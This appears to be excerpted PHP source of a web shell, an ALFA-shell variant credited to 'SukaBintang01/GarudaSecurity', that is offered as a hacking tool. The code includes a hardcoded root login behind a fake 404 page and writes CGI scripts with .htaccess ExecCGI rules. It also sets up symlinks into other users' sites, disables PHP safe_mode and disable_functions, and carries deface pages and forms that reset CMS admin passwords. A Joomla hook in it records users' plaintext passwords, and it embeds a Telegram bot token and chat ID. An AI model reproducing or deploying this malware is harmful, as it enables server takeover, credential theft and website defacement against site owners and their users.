<?php
/*
	Author: 	SukaBintang01/GarudaSecurity
	Telegram: 	https://telegram.me/SukaBintang01
	YouTube: 	https://youtube.com/SukaBintang01
	Gmail:		sukabintang84@gmail.com
*/
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'root',
    'password' => 'de12f5798f86bdcc5c759a645e913e4c',//md5(GarudaSecurity)
    'safe_mode' => '1',
    'login_page' => '404',
    'show_icons' => '1',
...
define("__SUKABINTANG01_DATA_FOLDER__", "SUKABINTANG01_DATA");
...
<center><img style="border-radius:100px;" width="500" height="250" alt="garsec team 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></center>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["sukabintang01cgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["sukabintang01cgiapi"])){
			if(!@file_exists("sukabintang01cgiapi/".$_COOKIE["sukabintang01cgiapi"].".sukabintang01")){
				$recreate = true;
				$lang = $_COOKIE["sukabintang01cgiapi"];
			}
		}
		if(!isset($_COOKIE["sukabintang01cgiapi"])||$recreate){
			...
			if($lang == "aspx"){
				...
				alfaWriteTocgiapi($lang.".sukabintang01",$source);
			}
			alfacgihtaccess('cgi', "sukabintang01cgiapi/");
		}else{
			$lang = $_COOKIE["sukabintang01cgiapi"];
		}
		$cgi_ext = ".sukabintang01";
		if($lang=="aspx"){
			$cgi_ext = ".aspx";
		}
		$cgi_url = __SUKABINTANG01_DATA_FOLDER__."/sukabintang01cgiapi/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("sukabintang01cgiapi", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("sukabintang01cgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
<?php
$telegram_token = "7479232652:AAHw7pLR6BxaXRxpwR4MbOVvrG3SU5pmW0c"; 
$chat_id = "6812471405"; 
...
<font color='#00A220'>Shell Coded By SukaBintang01 & GarudaSecurity (Garsec TEaM)</font><br>
<font color='#00A220'>Contact : sukabintang84@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @SukaBintang01</font><br>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["sukabintang01cgiapi_mode"])&&!isset($_COOKIE["sukabintang01cgiapi"])){
...
function alfaWriteTocgiapi($name, $source){
	$temp = "";
	$not_api = array("basedir.sukabintang01", "getdir.sukabintang01", "getheader.sukabintang01");
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __SUKABINTANG01_DATA_FOLDER__);
	}
	@mkdir('sukabintang01cgiapi',0755);
	__write_file("sukabintang01cgiapi/".$name, __get_resource($source));
	@chmod("sukabintang01cgiapi/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$tmp_path = alfaWriteTocgiapi("getheader.sukabintang01",$bash);
		$data = alfaEx("cd '{$tmp_path}/sukabintang01cgiapi';sh getheader.sukabintang01",false,true,true);
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./SukaBintang01 &copy; 2020-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1E47z61hurQyBuCTJeYyDZqTXUCmkytpGD\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>sukabintang84[at]gmail.com</span><span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/SukaBintang01'>@SukaBintang01</a></span></div></td>
</tr>
</table>
</div>
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/sukabintang01cgiapi/getdir.sukabintang01")){
			...
			$tmp_getdir_path = alfaWriteTocgiapi("getdir.sukabintang01",$bash);
			__alfa_set_cookie("alfachdir_bash", "true");
			__alfa_set_cookie("alfachdir_bash_path", $tmp_getdir_path);
		}
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/sukabintang01cgiapi;sh getdir.sukabintang01 '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
<textarea name=index rows='19' cols='103'><title>Hacked By SukaBintang01 & GarudaSecurity</title><b>Hacked By SukaBintang01 & GarudaSecurity</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By SukaBintang01 & GarudaSecurity</title><b>Hacked By SukaBintang01 & GarudaSecurity</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By SukaBintang01 & GarudaSecurity(Garsec TEaM)");
...
$table = array('td1' =>
 ...
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'sukabintang01', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'sukabintang01', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sukabintang84@gmail.com', 'inputSize' => '50')
);
create_table($table);
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'sukabintang01', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sukabintang84@gmail.com', 'inputSize' => '50')
);
create_table($table);
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __SUKABINTANG01_DATA_FOLDER__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__SUKABINTANG01_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__SUKABINTANG01_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__SUKABINTANG01_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
@chdir('cgialfa');
alfacgihtaccess('cgi');
$name = $_POST['alfa1'].'.sukabintang01';
...
@chmod($name,0755);
echo '<iframe src="'.__SUKABINTANG01_DATA_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
if($m=='cgi'){
$code = "#Coded By SukaBintang01 & GarudaSecurity\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .sukabintang01\nAddHandler cgi-script .sukabintang01";
}elseif($m=='sym'){
...
$tmp_path = alfaWriteTocgiapi("basedir.sukabintang01",$bash);
$bash_users  = alfaEx("cd ".$tmp_path."/sukabintang01cgiapi;sh basedir.sukabintang01 ".$makepwd,false,true,true);
...
$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$SUKABINTANG01_DATA = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($SUKABINTANG01_DATA, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
return('<iframe src="'.__SUKABINTANG01_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
